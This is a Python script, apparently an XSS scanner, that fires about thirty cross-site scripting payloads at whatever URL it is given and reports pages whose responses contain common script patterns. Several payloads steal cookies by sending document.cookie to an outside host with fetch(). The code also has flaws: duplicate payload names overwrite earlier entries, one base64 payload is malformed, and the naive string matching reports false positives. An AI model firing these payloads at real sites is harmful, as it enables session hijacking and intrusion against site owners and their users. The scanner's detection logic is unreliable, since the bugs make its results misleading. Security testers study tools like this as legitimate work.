import requests
from urllib.parse import quote

def check_xss(url, payloads):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
        'Accept': '*/*',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    vulnerabilities = []
    for name, payload in payloads.items():
        encoded_payload = quote(payload)
        test_url = f"{url}?q={encoded_payload}"
        try:
            response = requests.get(test_url, headers=headers)
            response_text = response.text

            # Check for XSS patterns in the response
            if any(pattern in response_text for pattern in [
                '<script>', 'alert(', 'console.log(', 'onerror=', 'onload=', 'javascript:', 'eval(', 'document.write', 'srcdoc'
            ]):
                vulnerabilities.append(name)

        except requests.RequestException as e:
            print(f"Request failed: {e}", file=sys.stderr)  # Print to stderr to avoid mixing with main output
    return vulnerabilities

if __name__ == "__main__":
    import sys
    if len(sys.argv) != 2:
        print("Usage: python check_xss.py <url>")
        sys.exit(1)

    url = sys.argv[1]
    payloads = {
        "Basic Script Alert": "<script>alert('xss')</script>",
        "Image Onerror": "<img src=x onerror=alert('xss')>",
        "Body Onload": "<body onload=alert('xss')>",
        "SVG Onload": "<svg onload=alert('xss')>",
        "Iframe Src": "<iframe src=javascript:alert('xss')>",
        "Link Href": "<link rel=stylesheet href=javascript:alert('xss')>",
        "Script Src": "<script src=javascript:alert('xss')></script>",
        "Javascript Alert": "javascript:alert('xss')",
        "Document Write": "<script>document.write('<img src=x onerror=alert(1)>')</script>",
        "Object Data": "<object data=javascript:alert('xss')>",
        "Form Button": "<form><button formaction=javascript:alert('xss')>Click me</button></form>",
        "Input Value": "<input type=text value=\"<img src=x onerror=alert('xss')>\">",
        "Style Import": "<style>@import'javascript:alert(1)';</style>",
        "Meta Refresh": "<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>",
        "Script Eval": "<script>eval('alert(1)')</script>",
        "Iframe Srcdoc": "<iframe srcdoc='<script>alert(1)</script>'></iframe>",
        "Base64 Script": "<script src=data:text/javascript;base64,YWxlcnQoJ3hzcyd9'></script>",
        "Details Ontoggle": "<details open ontoggle=alert('xss')>",
        "Marquee Onstart": "<marquee onstart=alert('xss')>",
        "Embed Src": "<embed src=javascript:alert('xss')>",
        "SVG Script": "<svg><script>alert(1)</script></svg>",
        "Anchor Href": "<a href='javascript:alert(1)'>Click here</a>",
        "Body Onload": "<body onload=alert(1)>",
        "Image Onerror": "<img src='x' onerror=alert(1)>",
        "Iframe Src": "<iframe src='javascript:alert(1)'></iframe>",
        "Input Script": "<input type=text value=''><script>alert(1)</script>",
        "Textarea Onfocus": "<textarea onfocus=alert(1)>",
        "Fetch Cookie": "<script>fetch('https://example.com?cookie=' + document.cookie)</script>",
        "Fetch POST": "<script>fetch('https://example.com', { method: 'POST', body: document.cookie })</script>",
        "SVG Fetch": "<svg/onload=fetch('https://example.com?cookie=' + document.cookie)>",
        "Iframe Srcdoc SVG": "<iframe srcdoc='<svg/onload=fetch(\\x27https://example.com?cookie=' + document.cookie + '\\x27)>'></iframe>"
    }
    vulnerabilities = check_xss(url, payloads)
    if vulnerabilities:
        print("Possible XSS vulnerabilities found:")
        for name in vulnerabilities:
            print(f"Payload Name: {name}")
    else:
        print("No XSS vulnerabilities found.")